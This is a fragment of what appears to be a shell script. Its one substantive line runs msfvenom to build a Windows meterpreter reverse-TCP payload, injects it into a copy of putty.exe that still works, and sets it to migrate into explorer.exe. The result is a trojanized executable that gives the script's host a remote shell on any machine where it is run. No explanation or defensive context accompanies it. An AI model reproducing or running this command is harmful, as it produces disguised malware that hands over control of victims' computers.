...
msfvenom -p windows/meterpreter/reverse_tcp lhost=$(hostname -I) lport=$1 PrependMigrateProc=explorer.exe PrependMigrate=true -x putty.exe -k -f exe -o rev_$1.exe
echo 
